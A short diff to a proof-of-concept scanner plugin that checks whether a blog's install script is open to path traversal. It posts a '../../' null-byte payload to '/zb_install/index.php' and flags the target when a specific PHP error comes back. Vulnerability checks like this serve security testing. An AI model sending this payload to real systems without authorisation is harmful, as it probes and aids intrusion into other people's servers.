@@ -36,9 +36,9 @@ class Poc(ABPoc):
             payload = '/zb_install/index.php' 
             postpayload = 'zbloglang=../../zb_system/image/admin/none.gif%00'
             url = '{target}'.format(target=self.target)+payload
-            code, head,res, errcode, _ = hh.http(' -d "%s" "%s"' % (postpayload,url))
-                       
-            if code == 500 and 'Cannot use a scalar value' in res:
+            req = requests.post(url, data=postpayload)
+            
+            if req.status_code == 500 and 'Cannot use a scalar value' in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
